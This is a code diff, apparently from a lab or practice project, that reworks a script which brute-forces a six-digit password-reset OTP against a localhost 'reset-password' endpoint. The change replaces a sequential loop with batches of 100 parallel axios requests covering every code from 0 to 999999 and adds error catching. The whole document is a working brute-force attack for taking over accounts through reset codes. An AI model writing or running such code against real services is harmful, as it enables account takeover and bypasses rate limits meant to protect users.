@@ -14,10 +14,21 @@ async function sendRequest(otp:string) {
         url:'https://localhost:3000/reset-password',
         data:data
     };
-    await axios.request(config)
-    return  0;
+    try{
+        await axios.request(config)
+    }catch(e){
+        console.log(e)
+    }
 }
-for(let i = 0; i<=999999; i++){
-    console.log(i);
-    sendRequest(i.toString());
+
+async function main() {
+    for(let i = 0; i<=999999; i+=100){
+        const p = [];
+        for(let j=0;j<100;j++){
+            p.push(sendRequest((i+j).toString()));
+        }
+        await Promise.all(p);
+    }
 }
+
+main();
